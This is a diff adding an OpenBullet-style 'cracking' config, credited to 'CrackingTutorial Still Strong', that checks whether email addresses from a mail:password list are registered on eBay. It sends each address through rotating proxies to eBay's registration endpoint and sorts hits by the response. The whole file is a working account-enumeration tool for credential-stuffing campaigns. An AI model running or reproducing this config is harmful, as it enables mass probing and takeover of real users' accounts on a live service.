@@ -1,0 +1,65 @@
+[SETTINGS]
+{
+  "Name": "Ebay Valid Mail Checker",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2020-07-02T17:21:14.1507225+05:00",
+  "AdditionalInfo": "check email are valid for target site or not",
+  "Author": "CrackingTutorial Still Strong",
+  "Version": "1.4.1 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Checking... REQUEST POST "https://reg.ebay.com/reg/ajax" 
+  CONTENT "email=<USER>&countryId=156&mode=5&eId=email&track=null&srcPage=2052190&ru=http%3A%2F%2Fwww.ebay.com" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36" 
+  HEADER "Origin: https://reg.ebay.com" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Referer: https://reg.ebay.com/reg/PartialReg?siteid=0&co_partnerId=0&UsingSSL=1&rv4=1&kmsi=1&signInUrl=https%3A%2F%2Fwww.ebay.com%2Fsignin%3Fsgn%3Dreg%26siteid%3D0%26co_partnerId%3D0%26UsingSSL%3D1%26rv4%3D1%26kmsi%3D1" 
+
+#Existence_Check KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "success\":true}" 
+  KEYCHAIN Failure OR 
+    KEY "success\":false}" 
+
